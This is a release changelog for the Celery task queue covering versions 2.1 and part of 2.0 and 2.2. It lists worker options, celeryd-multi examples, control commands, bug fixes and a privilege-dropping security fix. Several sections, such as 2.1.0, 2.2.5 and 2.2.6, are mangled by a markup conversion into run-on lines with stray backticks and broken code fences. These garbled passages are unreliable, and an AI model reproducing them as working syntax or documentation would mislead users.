    > For example, if `CELERY_QUEUES` defines four queues: <span class="title-ref">image</span>, <span class="title-ref">video</span>, <span class="title-ref">data</span> and <span class="title-ref">default</span>, the following command would make the worker only consume from the <span class="title-ref">image</span> and <span class="title-ref">video</span> queues:
    > 
    > ``` console
    > $ celeryd -Q image,video
    > ```

  - Worker: New return value for the <span class="title-ref">revoke</span> control command:
    
    > Now returns:
    > 
    > ``` python
    > {'ok': 'task $id revoked'}
    > ```
    > 
    > instead of <span class="title-ref">True</span>.

  - Worker: Can now enable/disable events using remote control
    
    > Example usage:
    > 
    > > \>\>\> from celery.task.control import broadcast \>\>\> broadcast('enable\_events') \>\>\> broadcast('disable\_events')

  - Removed top-level tests directory. Test config now in celery.tests.config
    
    > This means running the unit tests doesn't require any special setup. <span class="title-ref">celery/tests/\_\_init\_\_</span> now configures the `CELERY_CONFIG_MODULE` and `CELERY_LOADER` environment variables, so when <span class="title-ref">nosetests</span> imports that, the unit test environment is all set up.
    > 
    > Before you run the tests you need to install the test requirements:
    > 
    > ``` console
    > $ pip install -r requirements/test.txt
    > ```
    > 
    > Running all tests:
    > 
    > ``` console
    > $ nosetests
    > ```
    > 
    > Specifying the tests to run:
    > 
    > ``` console
    > $ nosetests celery.tests.test_task
    > ```
    > 
    > Producing HTML coverage:
    > 
    > ``` console
    > $ nosetests --with-coverage3
    > ```
    > 
    > The coverage output is then located in <span class="title-ref">celery/tests/cover/index.html</span>.

  - Worker: New option \`--version\`: Dump version info and exit.

  - `celeryd-multi <celeryd.bin.multi>`: Tool for shell scripts to start multiple workers.
    
    > Some examples:
    > 
    >   - Advanced example with 10 workers:
    >     
    >     >   - Three of the workers processes the images and video queue
    >     >   - Two of the workers processes the data queue with loglevel DEBUG
    >     >   - the rest processes the default' queue.
    >     > 
    >     > <!-- end list -->
    >     > 
    >     > ``` console
    >     > $ celeryd-multi start 10 -l INFO -Q:1-3 images,video -Q:4,5:data -Q default -L:4,5 DEBUG
    >     > ```
    > 
    >   - Get commands to start 10 workers, with 3 processes each
    >     
    >     > 
    >     > 
    >     > ``` console
    >     > $ celeryd-multi start 3 -c 3
    >     > celeryd -n celeryd1.myhost -c 3
    >     > celeryd -n celeryd2.myhost -c 3
    >     > celeryd -n celeryd3.myhost -c 3
    >     > ```
    > 
    >   - Start 3 named workers
    >     
    >     > 
    >     > 
    >     > ``` console
    >     > $ celeryd-multi start image video data -c 3
    >     > celeryd -n image.myhost -c 3
    >     > celeryd -n video.myhost -c 3
    >     > celeryd -n data.myhost -c 3
    >     > ```
    > 
    >   - Specify custom hostname
    >     
    >     > 
    >     > 
    >     > ``` console
    >     > $ celeryd-multi start 2 -n worker.example.com -c 3
    >     > celeryd -n celeryd1.worker.example.com -c 3
    >     > celeryd -n celeryd2.worker.example.com -c 3
    >     > ```
    >     > 
    >     > Additional options are added to each `celeryd`, but you can also modify the options for ranges of or single workers
    > 
    >   - 3 workers: Two with 3 processes, and one with 10 processes.
    >     
    >     > 
    >     > 
    >     > ``` console
    >     > $ celeryd-multi start 3 -c 3 -c:1 10
    >     > celeryd -n celeryd1.myhost -c 10
    >     > celeryd -n celeryd2.myhost -c 3
    >     > celeryd -n celeryd3.myhost -c 3
    >     > ```
    > 
    >   - Can also specify options for named workers
    >     
    >     > 
    >     > 
    >     > ``` console
    >     > $ celeryd-multi start image video data -c 3 -c:image 10
    >     > celeryd -n image.myhost -c 10
    >     > celeryd -n video.myhost -c 3
    >     > celeryd -n data.myhost -c 3
    >     > ```
    > 
    >   - Ranges and lists of workers in options is also allowed: (`-c:1-3` can also be written as `-c:1,2,3`)
    >     
    >     > 
    >     > 
    >     > ``` console
    >     > $ celeryd-multi start 5 -c 3  -c:1-3 10
    >     > celeryd-multi -n celeryd1.myhost -c 10
    >     > celeryd-multi -n celeryd2.myhost -c 10
    >     > celeryd-multi -n celeryd3.myhost -c 10
    >     > celeryd-multi -n celeryd4.myhost -c 3
    >     > celeryd-multi -n celeryd5.myhost -c 3
    >     > ```
    > 
    >   - Lists also work with named workers:
    >     
    >     > 
    >     > 
    >     > ``` console
    >     > $ celeryd-multi start foo bar baz xuzzy -c 3 -c:foo,bar,baz 10
    >     > celeryd-multi -n foo.myhost -c 10
    >     > celeryd-multi -n bar.myhost -c 10
    >     > celeryd-multi -n baz.myhost -c 10
    >     > celeryd-multi -n xuzzy.myhost -c 3
    >     > ```

  - The worker now calls the result backends <span class="title-ref">process\_cleanup</span> method *after* task execution instead of before.

\* AMQP result backend now supports Pika. \`\`\`

---

changelog-2.1.md

---

# Change history for Celery 2.1

<div class="contents" data-local="">

</div>

## 2.1.4

  - release-date  
    2010-12-03 12:00 p.m. CEST

  - release-by  
    Ask Solem

### Fixes

  - Execution options to <span class="title-ref">apply\_async</span> now takes precedence over options returned by active routers. This was a regression introduced recently (Issue \#244).

  - curses monitor: Long arguments are now truncated so curses doesn't crash with out of bounds errors (Issue \#235).

  - multi: Channel errors occurring while handling control commands no longer crash the worker but are instead logged with severity error.

  - SQLAlchemy database backend: Fixed a race condition occurring when the client wrote the pending state. Just like the Django database backend, it does no longer save the pending state (Issue \#261 + Issue \#262).

  - Error email body now uses <span class="title-ref">repr(exception)</span> instead of <span class="title-ref">str(exception)</span>, as the latter could result in Unicode decode errors (Issue \#245).

  - Error email timeout value is now configurable by using the `EMAIL_TIMEOUT` setting.

  - \`celeryev\`: Now works on Windows (but the curses monitor won't work without having curses).

  - Unit test output no longer emits non-standard characters.

  - worker: The broadcast consumer is now closed if the connection is reset.

  - worker: Now properly handles errors occurring while trying to acknowledge the message.

  -   - <span class="title-ref">TaskRequest.on\_failure</span> now encodes traceback using the current file-system  
        encoding (Issue \#286).

  - <span class="title-ref">EagerResult</span> can now be pickled (Issue \#288).

### Documentation

  - Adding \[contributing\](\#contributing).
  - Added \[guide-optimizing\](\#guide-optimizing).
  - Added \[faq-security\](\#faq-security) section to the FAQ.

## 2.1.3

  - release-date  
    2010-11-09 05:00 p.m. CEST

  - release-by  
    Ask Solem

<div id="v213-fixes">

  - Fixed deadlocks in <span class="title-ref">timer2</span> which could lead to <span class="title-ref">djcelerymon</span>/<span class="title-ref">celeryev -c</span> hanging.

  - \`EventReceiver\`: now sends heartbeat request to find workers.
    
    > This means `celeryev` and friends finds workers immediately at start-up.

  - `celeryev` curses monitor: Set screen\_delay to 10ms, so the screen refreshes more often.

  - Fixed pickling errors when pickling <span class="title-ref">AsyncResult</span> on older Python versions.

  - worker: prefetch count was decremented by ETA tasks even if there were no active prefetch limits.

</div>

## 2.1.2

  - release-data  
    TBA

### Fixes

  - worker: Now sends the `task-retried` event for retried tasks.
  - worker: Now honors ignore result for <span class="title-ref">\~@WorkerLostError</span> and timeout errors.
  - `celerybeat`: Fixed <span class="title-ref">UnboundLocalError</span> in `celerybeat` logging when using logging setup signals.
  - worker: All log messages now includes <span class="title-ref">exc\_info</span>.

## 2.1.1

  - release-date  
    2010-10-14 02:00 p.m. CEST

  - release-by  
    Ask Solem

### Fixes

  - Now working on Windows again.
    
    > Removed dependency on the `pwd`/`grp` modules.

  - snapshots: Fixed race condition leading to loss of events.

  - worker: Reject tasks with an ETA that cannot be converted to a time stamp.
    
    > See issue \#209

  - concurrency.processes.pool: The semaphore was released twice for each task (both at ACK and result ready).
    
    > This has been fixed, and it is now released only once per task.

  - docs/configuration: Fixed typo <span class="title-ref">CELERYD\_TASK\_SOFT\_TIME\_LIMIT</span> -\> `CELERYD_TASK_SOFT_TIME_LIMIT`.
    
    > See issue \#214

  - control command \`dump\_scheduled\`: was using old .info attribute

  -   - multi: Fixed <span class="title-ref">set changed size during iteration</span> bug  
        occurring in the restart command.

  - worker: Accidentally tried to use additional command-line arguments.
    
    > This would lead to an error like:
    > 
    > > <span class="title-ref">got multiple values for keyword argument 'concurrency'</span>.
    > > 
    > > Additional command-line arguments are now ignored, and doesn't produce this error. However -- we do reserve the right to use positional arguments in the future, so please don't depend on this behavior.

  - `celerybeat`: Now respects routers and task execution options again.

  - `celerybeat`: Now reuses the publisher instead of the connection.

  - Cache result backend: Using <span class="title-ref">float</span> as the expires argument to <span class="title-ref">cache.set</span> is deprecated by the Memcached libraries, so we now automatically cast to <span class="title-ref">int</span>.

  - unit tests: No longer emits logging and warnings in test output.

### News

  - Now depends on carrot version 0.10.7.

  - Added `CELERY_REDIRECT_STDOUTS`, and `CELERYD_REDIRECT_STDOUTS_LEVEL` settings.
    
    > `CELERY_REDIRECT_STDOUTS` is used by the worker and beat. All output to <span class="title-ref">stdout</span> and <span class="title-ref">stderr</span> will be redirected to the current logger if enabled.
    > 
    > `CELERY_REDIRECT_STDOUTS_LEVEL` decides the log level used and is <span class="title-ref">WARNING</span> by default.

  - Added `CELERYBEAT_SCHEDULER` setting.
    
    > This setting is used to define the default for the -S option to `celerybeat`.
    > 
    > Example:
    > 
    >   - \`\`\`python  
    >     CELERYBEAT\_SCHEDULER = 'djcelery.schedulers.DatabaseScheduler'

  - Added Task.expires: Used to set default expiry time for tasks.

  - New remote control commands: <span class="title-ref">add\_consumer</span> and <span class="title-ref">cancel\_consumer</span>.
    
    > 
    > 
    > <div class="method" data-module="">
    > 
    > add\_consumer(queue, exchange, exchange\_type, routing\_key, \*\*options)
    > 
    > Tells the worker to declare and consume from the specified declaration.
    > 
    > </div>
    > 
    > <div class="method" data-module="">
    > 
    > cancel\_consumer(queue\_name)
    > 
    > Tells the worker to stop consuming from queue (by queue name).
    > 
    > </div>
    > 
    > Commands also added to `celeryctl` and <span class="title-ref">\~celery.task.control.inspect</span>.
    > 
    > Example using `celeryctl` to start consuming from queue "queue", in exchange "exchange", of type "direct" using binding key "key":
    > 
    > ``` console
    > $ celeryctl inspect add_consumer queue exchange direct key
    > $ celeryctl inspect cancel_consumer queue
    > ```
    > 
    > See \[monitoring-control\](\#monitoring-control) for more information about the `celeryctl` program.
    > 
    > Another example using \`\~celery.task.control.inspect\`:
    > 
    > ``` pycon
    > >>> from celery.task.control import inspect
    > >>> inspect.add_consumer(queue='queue', exchange='exchange',
    > ...                      exchange_type='direct',
    > ...                      routing_key='key',
    > ...                      durable=False,
    > ...                      auto_delete=True)
    > 
    > >>> inspect.cancel_consumer('queue')
    > ```

  - `celerybeat`: Now logs the traceback if a message can't be sent.

  - `celerybeat`: Now enables a default socket timeout of 30 seconds.

  - `README`/introduction/homepage: Added link to [Flask-Celery](https://github.com/ask/flask-celery).

<div id="version-2.1.0">

2.1.0 `` ` ===== :release-date: 2010-10-08 12:00 p.m. CEST :release-by: Ask Solem  .. _v210-important:  Important Notes ---------------  * Celery is now following the versioning semantics defined by `semver`_.      This means we're no longer allowed to use odd/even versioning semantics     By our previous versioning scheme this stable release should've     been version 2.2.    * Now depends on Carrot 0.10.7.  * No longer depends on SQLAlchemy, this needs to be installed separately   if the database result backend is used.  * :pypi:`django-celery` now comes with a monitor for the Django Admin   interface. This can also be used if you're not a Django user.   (Update: Django-Admin monitor has been replaced with Flower, see the   Monitoring guide).  * If you get an error after upgrading saying:   `AttributeError: 'module' object has no attribute 'system'`,      Then this is because the `celery.platform` module has been     renamed to `celery.platforms` to not collide with the built-in     :mod:`platform` module.      You have to remove the old :file:`platform.py` (and maybe     :file:`platform.pyc`) file from your previous Celery installation.      To do this use :program:`python` to find the location     of this module: ``\`console $ python \>\>\> import celery.platform \>\>\> celery.platform \<module 'celery.platform' from '/opt/devel/celery/celery/platform.pyc'\>

</div>

> Here the compiled module is in `/opt/devel/celery/celery/`, to remove the offending files do:
> 
> ``` console
> $ rm -f /opt/devel/celery/celery/platform.py*
> ```

<div id="v210-news">

News `` ` ----  * Added support for expiration of AMQP results (requires RabbitMQ 2.1.0)      The new configuration option :setting:`CELERY_AMQP_TASK_RESULT_EXPIRES`     sets the expiry time in seconds (can be int or float): ``\`python CELERY\_AMQP\_TASK\_RESULT\_EXPIRES = 30 \* 60 \# 30 minutes. CELERY\_AMQP\_TASK\_RESULT\_EXPIRES = 0.80 \# 800 ms.

</div>

  - `celeryev`: Event Snapshots
    
    > If enabled, the worker sends messages about what the worker is doing. These messages are called "events". The events are used by real-time monitors to show what the cluster is doing, but they're not very useful for monitoring over a longer period of time. Snapshots lets you take "pictures" of the clusters state at regular intervals. This can then be stored in a database to generate statistics with, or even monitoring over longer time periods.
    > 
    > `django-celery` now comes with a Celery monitor for the Django Admin interface. To use this you need to run the `django-celery` snapshot camera, which stores snapshots to the database at configurable intervals.
    > 
    > To use the Django admin monitor you need to do the following:
    > 
    > 1.  Create the new database tables:
    >     
    >     > 
    >     > 
    >     > ``` console
    >     > $ python manage.py syncdb
    >     > ```
    > 
    > 2.  Start the `django-celery` snapshot camera:
    >     
    >     > 
    >     > 
    >     > ``` console
    >     > $ python manage.py celerycam
    >     > ```
    > 
    > 3.  Open up the django admin to monitor your cluster.
    > 
    > The admin interface shows tasks, worker nodes, and even lets you perform some actions, like revoking and rate limiting tasks, and shutting down worker nodes.
    > 
    > There's also a Debian init.d script for `~celery.bin.events` available, see \[daemonizing\](\#daemonizing) for more information.
    > 
    > New command-line arguments to `celeryev`:
    > 
    > >   - `celery events --camera`: Snapshot camera class to use.
    > >   - `celery events --logfile`: Log file
    > >   - `celery events --loglevel`: Log level
    > >   - `celery events --maxrate`: Shutter rate limit.
    > >   - `celery events --freq`: Shutter frequency
    > 
    > The `--camera <celery events --camera>` argument is the name of a class used to take snapshots with. It must support the interface defined by <span class="title-ref">celery.events.snapshot.Polaroid</span>.
    > 
    > Shutter frequency controls how often the camera thread wakes up, while the rate limit controls how often it will actually take a snapshot. The rate limit can be an integer (snapshots/s), or a rate limit string which has the same syntax as the task rate limit strings (<span class="title-ref">"200/m"</span>, <span class="title-ref">"10/s"</span>, <span class="title-ref">"1/h",</span> etc).
    > 
    > For the Django camera case, this rate limit can be used to control how often the snapshots are written to the database, and the frequency used to control how often the thread wakes up to check if there's anything new.
    > 
    > The rate limit is off by default, which means it will take a snapshot for every `--frequency <celery events --frequency>` seconds.

  - \`\~celery.task.control.broadcast\`: Added callback argument, this can be used to process replies immediately as they arrive.

  - `celeryctl`: New command line utility to manage and inspect worker nodes, apply tasks and inspect the results of tasks.
    
    > 
    > 
    > <div class="seealso">
    > 
    > The \[monitoring-control\](\#monitoring-control) section in the \[guide\](\#guide).
    > 
    > </div>
    > 
    > Some examples:
    > 
    > ``` console
    > $ celeryctl apply tasks.add -a '[2, 2]' --countdown=10
    > 
    > $ celeryctl inspect active
    > $ celeryctl inspect registered_tasks
    > $ celeryctl inspect scheduled
    > $ celeryctl inspect --help
    > $ celeryctl apply --help
    > ```

  - Added the ability to set an expiry date and time for tasks.
    
    > Example:
    > 
    >     >>> # Task expires after one minute from now.
    >     >>> task.apply_async(args, kwargs, expires=60)
    >     >>> # Also supports datetime
    >     >>> task.apply_async(args, kwargs,
    >     ...                  expires=datetime.now() + timedelta(days=1)
    > 
    > When a worker receives a task that's been expired it will be marked as revoked (<span class="title-ref">\~@TaskRevokedError</span>).

  - Changed the way logging is configured.
    
    > We now configure the root logger instead of only configuring our custom logger. In addition we don't hijack the multiprocessing logger anymore, but instead use a custom logger name for different applications:
    > 
    > | **Application** | **Logger Name** |
    > | --------------- | --------------- |
    > | `celeryd`       | `"celery"`      |
    > | `celerybeat`    | `"celery.beat"` |
    > | `celeryev`      | `"celery.ev"`   |
    > 

    > This means that the <span class="title-ref">loglevel</span> and <span class="title-ref">logfile</span> arguments will affect all registered loggers (even those from third-party libraries). Unless you configure the loggers manually as shown below, that is.
    > 
    > *Users can choose to configure logging by subscribing to the :signal:\`\~celery.signals.setup\_logging\` signal:*
    > 
    > ``` python
    > from logging.config import fileConfig
    > from celery import signals
    > 
    > @signals.setup_logging.connect
    > def setup_logging(**kwargs):
    >     fileConfig('logging.conf')
    > ```
    > 
    > If there are no receivers for this signal, the logging subsystem will be configured using the `--loglevel <celery worker --loglevel>`/ `--logfile <celery worker --logfile>` arguments, this will be used for *all defined loggers*.
    > 
    > Remember that the worker also redirects stdout and stderr to the Celery logger, if manually configure logging you also need to redirect the standard outs manually:
    > 
    > ``` python
    > from logging.config import fileConfig
    > from celery import log
    > 
    > def setup_logging(**kwargs):
    >     import logging
    >     fileConfig('logging.conf')
    >     stdouts = logging.getLogger('mystdoutslogger')
    >     log.redirect_stdouts_to_logger(stdouts, loglevel=logging.WARNING)
    > ```

  - worker Added command line option `--include <celery worker --include>`:
    
    > A comma separated list of (task) modules to be imported.
    > 
    > Example:
    > 
    > ``` console
    > $ celeryd -I app1.tasks,app2.tasks
    > ```

  - worker: now emits a warning if running as the root user (euid is 0).

  - \`celery.messaging.establish\_connection\`: Ability to override defaults used using keyword argument "defaults".

  - worker: Now uses <span class="title-ref">multiprocessing.freeze\_support()</span> so that it should work with **py2exe**, **PyInstaller**, **cx\_Freeze**, etc.

  - worker: Now includes more meta-data for the `STARTED` state: PID and host name of the worker that started the task.
    
    > See issue \#181

  - subtask: Merge additional keyword arguments to <span class="title-ref">subtask()</span> into task keyword arguments.
    
    > For example:
    > 
    > ``` pycon
    > >>> s = subtask((1, 2), {'foo': 'bar'}, baz=1)
    > >>> s.args
    > (1, 2)
    > >>> s.kwargs
    > {'foo': 'bar', 'baz': 1}
    > ```
    > 
    > See issue \#182.

  - worker: Now emits a warning if there's already a worker node using the same name running on the same virtual host.

  - AMQP result backend: Sending of results are now retried if the connection is down.

  - AMQP result backend: \`result.get()<span class="title-ref">: Wait for next state if state isn't in </span>\~celery.states.READY\_STATES\`.

  - TaskSetResult now supports subscription.
    
    > 
    > 
    >     >>> res = TaskSet(tasks).apply_async()
    >     >>> res[0].get()

  - Added <span class="title-ref">Task.send\_error\_emails</span> + <span class="title-ref">Task.error\_whitelist</span>, so these can be configured per task instead of just by the global setting.

  - Added <span class="title-ref">Task.store\_errors\_even\_if\_ignored</span>, so it can be changed per Task, not just by the global setting.

  - The Crontab scheduler no longer wakes up every second, but implements <span class="title-ref">remaining\_estimate</span> (*Optimization*).

  -   - worker: Store `FAILURE` result if the  
        <span class="title-ref">\~@WorkerLostError</span> exception occurs (worker process disappeared).

  - worker: Store `FAILURE` result if one of the <span class="title-ref">\*TimeLimitExceeded</span> exceptions occurs.

  - Refactored the periodic task responsible for cleaning up results.
    
    >   -   - The backend cleanup task is now only added to the schedule if  
    >         `CELERY_TASK_RESULT_EXPIRES` is set.
    > 
    >   - If the schedule already contains a periodic task named "celery.backend\_cleanup" it won't change it, so the behavior of the backend cleanup task can be easily changed.
    > 
    >   - The task is now run every day at 4:00 AM, rather than every day since the first time it was run (using Crontab schedule instead of <span class="title-ref">run\_every</span>)
    > 
    >   -   - Renamed <span class="title-ref">celery.task.builtins.DeleteExpiredTaskMetaTask</span>  
    >         \-\> <span class="title-ref">celery.task.builtins.backend\_cleanup</span>
    > 
    >   - The task itself has been renamed from "celery.delete\_expired\_task\_meta" to "celery.backend\_cleanup"
    > 
    > See issue \#134.

  - Implemented <span class="title-ref">AsyncResult.forget</span> for SQLAlchemy/Memcached/Redis/Tokyo Tyrant backends (forget and remove task result).
    
    > See issue \#184.

  - \`TaskSetResult.join \<celery.result.TaskSetResult.join\>\`: Added 'propagate=True' argument.
    
    When set to <span class="title-ref">False</span> exceptions occurring in subtasks will not be re-raised.

  - Added <span class="title-ref">Task.update\_state(task\_id, state, meta)</span> as a shortcut to <span class="title-ref">task.backend.store\_result(task\_id, meta, state)</span>.
    
    > The backend interface is "private" and the terminology outdated, so better to move this to <span class="title-ref">\~celery.task.base.Task</span> so it can be used.

  - timer2: Set <span class="title-ref">self.running=False</span> in <span class="title-ref">\~celery.utils.timer2.Timer.stop</span> so it won't try to join again on subsequent calls to <span class="title-ref">stop()</span>.

  - Log colors are now disabled by default on Windows.

  - <span class="title-ref">celery.platform</span> renamed to `celery.platforms`, so it doesn't collide with the built-in `platform` module.

  - Exceptions occurring in Mediator+Pool callbacks are now caught and logged instead of taking down the worker.

  - Redis result backend: Now supports result expiration using the Redis <span class="title-ref">EXPIRE</span> command.

  - unit tests: Don't leave threads running at tear down.

  - worker: Task results shown in logs are now truncated to 46 chars.

  -   - <span class="title-ref">Task.\_\_name\_\_</span> is now an alias to <span class="title-ref">self.\_\_class\_\_.\_\_name\_\_</span>.  
        This way tasks introspects more like regular functions.

  - \`Task.retry\`: Now raises <span class="title-ref">TypeError</span> if kwargs argument is empty.
    
    > See issue \#164.

  - `timedelta_seconds`: Use `timedelta.total_seconds` if running on Python 2.7

  - \`\~kombu.utils.limits.TokenBucket\`: Generic Token Bucket algorithm

  - `celery.events.state`: Recording of cluster state can now be paused and resumed, including support for buffering.
    
    > 
    > 
    > <div class="method">
    > 
    > State.freeze(buffer=True)
    > 
    > Pauses recording of the stream.
    > 
    > If <span class="title-ref">buffer</span> is true, events received while being frozen will be buffered, and may be replayed later.
    > 
    > </div>
    > 
    > <div class="method">
    > 
    > State.thaw(replay=True)
    > 
    > Resumes recording of the stream.
    > 
    > If <span class="title-ref">replay</span> is true, then the recorded buffer will be applied.
    > 
    > </div>
    > 
    > <div class="method">
    > 
    > State.freeze\_while(fun)
    > 
    > With a function to apply, freezes the stream before, and replays the buffer after the function returns.
    > 
    > </div>

  - <span class="title-ref">EventReceiver.capture \<celery.events.EventReceiver.capture\></span> Now supports a timeout keyword argument.

  - worker: The mediator thread is now disabled if `CELERY_RATE_LIMITS` is enabled, and tasks are directly sent to the pool without going through the ready queue (*Optimization*).

<div id="v210-fixes">

Fixes `` ` -----  * Pool: Process timed out by `TimeoutHandler` must be joined by the Supervisor,   so don't remove it from the internal process list.      See issue #192.  * `TaskPublisher.delay_task` now supports exchange argument, so exchange can be   overridden when sending tasks in bulk using the same publisher      See issue #187.  * the worker no longer marks tasks as revoked if :setting:`CELERY_IGNORE_RESULT`   is enabled.      See issue #207.  * AMQP Result backend: Fixed bug with `result.get()` if   :setting:`CELERY_TRACK_STARTED` enabled.      `result.get()` would stop consuming after receiving the     :state:`STARTED` state.  * Fixed bug where new processes created by the pool supervisor becomes stuck   while reading from the task Queue.      See http://bugs.python.org/issue10037  * Fixed timing issue when declaring the remote control command reply queue      This issue could result in replies being lost, but have now been fixed.  * Backward compatible `LoggerAdapter` implementation: Now works for Python 2.4.      Also added support for several new methods:     `fatal`, `makeRecord`, `_log`, `log`, `isEnabledFor`,     `addHandler`, `removeHandler`.  .. _v210-experimental:  Experimental ------------  * multi: Added daemonization support.      multi can now be used to start, stop and restart worker nodes: ``\`console $ celeryd-multi start jerry elaine george kramer

</div>

> This also creates PID files and log files (`celeryd@jerry.pid`, ..., `celeryd@jerry.log`. To specify a location for these files use the <span class="title-ref">--pidfile</span> and <span class="title-ref">--logfile</span> arguments with the <span class="title-ref">%n</span> format:
> 
> ``` console
> $ celeryd-multi start jerry elaine george kramer \
>                 --logfile=/var/log/celeryd@%n.log \
>                 --pidfile=/var/run/celeryd@%n.pid
> ```
> 
> Stopping:
> 
> ``` console
> $ celeryd-multi stop jerry elaine george kramer
> ```
> 
> Restarting. The nodes will be restarted one by one as the old ones are shutdown:
> 
> ``` console
> $ celeryd-multi restart jerry elaine george kramer
> ```
> 
> Killing the nodes (**WARNING**: Will discard currently executing tasks):
> 
> ``` console
> $ celeryd-multi kill jerry elaine george kramer
> ```
> 
> See <span class="title-ref">celeryd-multi help</span> for help.

  - multi: <span class="title-ref">start</span> command renamed to <span class="title-ref">show</span>.
    
    > <span class="title-ref">celeryd-multi start</span> will now actually start and detach worker nodes. To just generate the commands you have to use <span class="title-ref">celeryd-multi show</span>.

  - worker: Added <span class="title-ref">--pidfile</span> argument.
    
    > The worker will write its pid when it starts. The worker will not be started if this file exists and the pid contained is still alive.

  - Added generic init.d script using <span class="title-ref">celeryd-multi</span>
    
    > <https://github.com/celery/celery/tree/master/extra/generic-init.d/celeryd>

<div id="v210-documentation">

Documentation \`\`\` -------------

</div>

  - Added User guide section: Monitoring

  - Added user guide section: Periodic Tasks
    
    > Moved from <span class="title-ref">getting-started/periodic-tasks</span> and updated.

  - tutorials/external moved to new section: "community".

  - References has been added to all sections in the documentation.
    
    > This makes it easier to link between documents.

---

changelog-2.2.md

---

# Change history for Celery 2.2

<div class="contents" data-local="">

</div>

## 2.2.8

  - release-date  
    2011-11-25 04:00 p.m. GMT

  - release-by  
    Ask Solem

### Security Fixes

  - \[Security: [CELERYSA-0001](https://github.com/celery/celery/tree/master/docs/sec/CELERYSA-0001.txt)\] Daemons would set effective id's rather than real id's when the `!--uid`/ `!--gid` arguments to `celery multi`, `celeryd_detach`, `celery beat` and `celery events` were used.
    
    This means privileges weren't properly dropped, and that it would be possible to regain supervisor privileges later.

## 2.2.7

  - release-date  
    2011-06-13 04:00 p.m. BST

  - release-by  
    Ask Solem

<!-- end list -->

  - New signals: `after_setup_logger` and `after_setup_task_logger`
    
    > These signals can be used to augment logging configuration after Celery has set up logging.

  - Redis result backend now works with Redis 2.4.4.

  - multi: The `!--gid` option now works correctly.

  - worker: Retry wrongfully used the repr of the traceback instead of the string representation.

  - App.config\_from\_object: Now loads module, not attribute of module.

  - Fixed issue where logging of objects would give "\<Unrepresentable: ...\>"

## 2.2.6

  - release-date  
    2011-04-15 04:00 p.m. CEST

  - release-by  
    Ask Solem

### Important Notes

  - Now depends on `Kombu` 1.1.2.

  - Dependency lists now explicitly specifies that we don't want `python-dateutil` 2.x, as this version only supports Python 3.
    
    > If you have installed dateutil 2.0 by accident you should downgrade to the 1.5.0 version:
    > 
    > `` `console     $ pip install -U python-dateutil==1.5.0  or by ``easy\_install\`\`:
    > 
    > ``` console
    > $ easy_install -U python-dateutil==1.5.0
    > ```

<div id="v226-fixes">

Fixes `` ` -----  * The new ``WatchedFileHandler`broke Python 2.5 support (Issue #367).  * Task: Don't use`app.main`if the task name is set explicitly.  * Sending emails didn't work on Python 2.5, due to a bug in   the version detection code (Issue #378).  * Beat: Adds method`ScheduleEntry.\_default\_now`This method can be overridden to change the default value     of`last\_run\_at`.  * An error occurring in process cleanup could mask task errors.    We no longer propagate errors happening at process cleanup,   but log them instead. This way they won't interfere with publishing   the task result (Issue #365).  * Defining tasks didn't work properly when using the Django`shell\_plus`utility (Issue #366).  *`AsyncResult.get`didn't accept the`interval`and`propagate``arguments.  * worker: Fixed a bug where the worker wouldn't shutdown if a    `socket.error` was raised.  .. _version-2.2.5:  2.2.5 ===== :release-date: 2011-03-28 06:00 p.m. CEST :release-by: Ask Solem  .. _v225-important:  Important Notes ---------------  * Now depends on Kombu 1.0.7  .. _v225-news:  News ----  * Our documentation is now hosted by Read The Docs   (https://docs.celeryq.dev), and all links have been changed to point to   the new URL.  * Logging: Now supports log rotation using external tools like `logrotate.d`_   (Issue #321)      This is accomplished by using the``WatchedFileHandler`, which re-opens     the file if it's renamed or deleted.     *`otherqueues`tutorial now documents how to configure Redis/Database result    backends.  * gevent: Now supports ETA tasks.      But gevent still needs`CELERY\_DISABLE\_RATE\_LIMITS=True`to work.  * TaskSet User Guide: now contains TaskSet callback recipes.  * Eventlet: New signals:      *`eventlet\_pool\_started`*`eventlet\_pool\_preshutdown`*`eventlet\_pool\_postshutdown`*`eventlet\_pool\_apply``See :mod:`celery.signals` for more information.  * New :setting:`BROKER_TRANSPORT_OPTIONS` setting can be used to pass   additional arguments to a particular broker transport.  * worker:``worker\_pid`is now part of the request info as returned by   broadcast commands.  * TaskSet.apply/Taskset.apply_async now accepts an optional`taskset\_id`argument.  * The taskset_id (if any) is now available in the Task request context.  * SQLAlchemy result backend: taskset_id and taskset_id columns now have a   unique constraint (tables need to recreated for this to take affect).  * Task user guide: Added section about choosing a result backend.  * Removed unused attribute`AsyncResult.uuid`.  .. _v225-fixes:  Fixes -----  * multiprocessing.Pool:  Fixes race condition when marking job with`WorkerLostError`(Issue #268).      The process may have published a result before it was terminated,     but we have no reliable way to detect that this is the case.      So we have to wait for 10 seconds before marking the result with     WorkerLostError. This gives the result handler a chance to retrieve the     result.  * multiprocessing.Pool: Shutdown could hang if rate limits disabled.      There was a race condition when the MainThread was waiting for the pool     semaphore to be released. The ResultHandler now terminates after 5     seconds if there are unacked jobs, but no worker processes left to start     them  (it needs to timeout because there could still be an ack+result     that we haven't consumed from the result queue. It     is unlikely we'll receive any after 5 seconds with no worker processes).  *`celerybeat`: Now creates pidfile even if the`--detach`option isn't set.  * eventlet/gevent: The broadcast command consumer is now running in a separate   green-thread.      This ensures broadcast commands will take priority even if there are many     active tasks.  * Internal module`celery.worker.controllers`renamed to`celery.worker.mediator`.  * worker: Threads now terminates the program by calling`os.\_exit`, as it   is the only way to ensure exit in the case of syntax errors, or other   unrecoverable errors.  * Fixed typo in`maybe\_timedelta`(Issue #352).  * worker: Broadcast commands now logs with loglevel debug instead of warning.  * AMQP Result Backend: Now resets cached channel if the connection is lost.  * Polling results with the AMQP result backend wasn't working properly.  * Rate limits: No longer sleeps if there are no tasks, but rather waits for   the task received condition (Performance improvement).  * ConfigurationView:`iter(dict)`should return keys, not items (Issue #362).  *`celerybeat`:  PersistentScheduler now automatically removes a corrupted   schedule file (Issue #346).  * Programs that doesn't support positional command-line arguments now provides   a user friendly error message.  * Programs no longer tries to load the configuration file when showing`--version`(Issue #347).  * Autoscaler: The "all processes busy" log message is now severity debug   instead of error.  * worker: If the message body can't be decoded, it's now passed through`safe\_str`when logging.      This to ensure we don't get additional decoding errors when trying to log     the failure.  *`app.config\_from\_object`/`app.config\_from\_envvar`now works for all   loaders.  * Now emits a user-friendly error message if the result backend name is   unknown (Issue #349).  *`celery.contrib.batches`: Now sets loglevel and logfile in the task   request so`task.get\_logger`works with batch tasks (Issue #357).  * worker: An exception was raised if using the amqp transport and the prefetch   count value exceeded 65535 (Issue #359).      The prefetch count is incremented for every received task with an     ETA/countdown defined. The prefetch count is a short, so can only support     a maximum value of 65535. If the value exceeds the maximum value we now     disable the 